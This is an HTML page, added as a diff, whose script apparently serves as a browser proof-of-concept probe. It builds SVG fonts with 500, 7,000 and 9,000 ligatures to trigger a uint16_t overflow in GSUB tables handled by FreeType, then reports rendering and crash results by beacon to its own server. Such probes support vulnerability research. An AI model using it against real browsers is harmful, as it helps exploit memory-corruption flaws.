@@ -1,0 +1,156 @@
+<!doctype html><html><head><meta charset="utf-8"><title>v83</title>
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+</head><body><script>
+// p253 inline — SVG-to-OTF GSUB uint16_t overflow test
+// Tests whether 7000+ ligature SVG font triggers GSUB table corruption
+// that FreeType then processes. Compares safe vs overflow font rendering.
+var BQ=[],BS=false;
+function B(t,b){BQ.push([t,b||'']);if(!BS)dr();}
+function dr(){if(!BQ.length){BS=false;return;}BS=true;var i=BQ.shift();
+try{navigator.sendBeacon('/beacon/V253-'+i[0]+'?t='+Date.now(),i[1]);}catch(e){}
+setTimeout(dr,15);}
+
+B('BOOT');
+var bc='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+
+function mkSVG(fam,nLig){
+  var p=['<?xml version="1.0"?>','<svg xmlns="http://www.w3.org/2000/svg">',
+    '<defs><font id="F" horiz-adv-x="500">',
+    '<font-face font-family="'+fam+'" units-per-em="1000" ascent="800" descent="-200"/>',
+    '<missing-glyph horiz-adv-x="500" d="M0 0h500v800h-500z"/>'];
+  for(var i=0;i<bc.length;i++)
+    p.push('<glyph unicode="'+bc[i]+'" horiz-adv-x="600" d="M100 0h400v700h-400z"/>');
+  var n=0;
+  for(var a=0;a<bc.length&&n<nLig;a++)
+    for(var b=0;b<bc.length&&n<nLig;b++){
+      p.push('<glyph unicode="'+bc[a]+bc[b]+'" horiz-adv-x="'+(800+(n%400))+'" d="M0 0h800v700h-800z"/>');
+      n++;
+    }
+  p.push('</font></defs></svg>');
+  return p.join('\n');
+}
+
+function loadFont(fam,svg,cb){
+  var blob=new Blob([svg],{type:'image/svg+xml'});
+  var url=URL.createObjectURL(blob);
+  var st=document.createElement('style');
+  st.textContent='@font-face{font-family:"'+fam+'";src:url("'+url+'") format("svg");}';
+  document.head.appendChild(st);
+  var d=document.createElement('div');
+  d.style.cssText='position:absolute;left:-9999px;font-family:"'+fam+'",monospace;font-size:48px;';
+  d.textContent='abcdefghijklmnop';
+  document.body.appendChild(d);
+  setTimeout(function(){cb(url,d);},3000);
+}
+
+function measure(fam){
+  var c=document.createElement('canvas');
+  c.width=1200;c.height=100;
+  var ctx=c.getContext('2d');
+  ctx.font='48px "'+fam+'"';
+  var wA=ctx.measureText('a').width;
+  var wAB=ctx.measureText('ab').width;
+  var wABC=ctx.measureText('abc').width;
+  var pairs=['ab','cd','ef','gh','ij','kl','mn','op','qr','st'];
+  var pw=[];
+  for(var i=0;i<pairs.length;i++)
+    pw.push(pairs[i]+':'+ctx.measureText(pairs[i]).width.toFixed(1));
+  ctx.clearRect(0,0,1200,100);
+  ctx.fillText('abcdefghijklmnop',10,60);
+  var px=ctx.getImageData(0,0,1200,100).data;
+  var nz=0;
+  for(var p=3;p<px.length;p+=4) if(px[p]>0) nz++;
+  return {wA:wA,wAB:wAB,wABC:wABC,pairs:pw,pix:nz,
+    lig:Math.abs(wAB-2*wA)>1};
+}
+
+// Test A: Safe font (500 ligatures, no overflow)
+function testA(){
+  B('A-START');
+  try{
+    var svg=mkSVG('Safe253',500);
+    B('A-SVG-'+svg.length+'B');
+    loadFont('Safe253',svg,function(url){
+      try{
+        var m=measure('Safe253');
+        B('A-WIDTHS','a='+m.wA.toFixed(1)+' ab='+m.wAB.toFixed(1)+' abc='+m.wABC.toFixed(1));
+        B('A-LIG-'+(m.lig?'YES':'NO'));
+        B('A-PAIRS',m.pairs.join(' '));
+        B('A-PIX-'+m.pix);
+        URL.revokeObjectURL(url);
+      }catch(e){B('A-ERR-'+e.message.substring(0,50));}
+      setTimeout(testB,500);
+    });
+  }catch(e){B('A-FAIL-'+e.message.substring(0,50));setTimeout(testB,500);}
+}
+
+// Test B: Overflow font (7000 ligatures, triggers uint16_t truncation)
+function testB(){
+  B('B-START');
+  try{
+    var svg=mkSVG('Ovf253',7000);
+    B('B-SVG-'+svg.length+'B');
+    loadFont('Ovf253',svg,function(url){
+      try{
+        var m=measure('Ovf253');
+        B('B-WIDTHS','a='+m.wA.toFixed(1)+' ab='+m.wAB.toFixed(1)+' abc='+m.wABC.toFixed(1));
+        B('B-LIG-'+(m.lig?'YES':'NO'));
+        B('B-PAIRS',m.pairs.join(' '));
+        B('B-PIX-'+m.pix);
+        URL.revokeObjectURL(url);
+      }catch(e){B('B-ERR-'+e.message.substring(0,50));}
+      setTimeout(testC,500);
+    });
+  }catch(e){B('B-FAIL-'+e.message.substring(0,50));setTimeout(testC,500);}
+}
+
+// Test C: Heavy GSUB exercise with overflow font (crash detection)
+function testC(){
+  B('C-START');
+  try{
+    var svg=mkSVG('Heavy253',9000);
+    B('C-SVG-'+svg.length+'B');
+    loadFont('Heavy253',svg,function(url){
+      try{
+        var c=document.createElement('canvas');
+        c.width=2000;c.height=200;
+        var ctx=c.getContext('2d');
+        ctx.font='32px "Heavy253"';
+        var rendered=0;
+        for(var r=0;r<100;r++){
+          var t='';
+          for(var ch=0;ch<50;ch++)
+            t+=bc[(r*7+ch)%62]+bc[(r*13+ch)%62];
+          ctx.fillText(t,0,(r%5)*40+20);
+          rendered++;
+        }
+        B('C-RENDERED-'+rendered);
+        B('C-SURVIVED');
+
+        // Wide range of pairs to detect GSUB corruption effects
+        var testPairs=[];
+        for(var i=0;i<62;i+=5)
+          for(var j=0;j<62;j+=10)
+            testPairs.push(bc[i]+bc[j]);
+        var noLig=0;
+        var sample=[];
+        for(var k=0;k<testPairs.length;k++){
+          var pr=testPairs[k];
+          var w=ctx.measureText(pr).width;
+          var w1=ctx.measureText(pr[0]).width;
+          var w2=ctx.measureText(pr[1]).width;
+          var isL=Math.abs(w-(w1+w2))>1;
+          if(k<20) sample.push(pr+':'+w.toFixed(0)+(isL?'L':'N'));
+          if(!isL) noLig++;
+        }
+        B('C-SAMPLE',sample.join(' '));
+        B('C-TOTAL-'+testPairs.length+'-NOLIG-'+noLig);
+        URL.revokeObjectURL(url);
+      }catch(e){B('C-ERR-'+e.message.substring(0,50));}
+      B('DONE');
+    });
+  }catch(e){B('C-FAIL-'+e.message.substring(0,50));B('DONE');}
+}
+
+setTimeout(testA,100);
+</script></body></html>
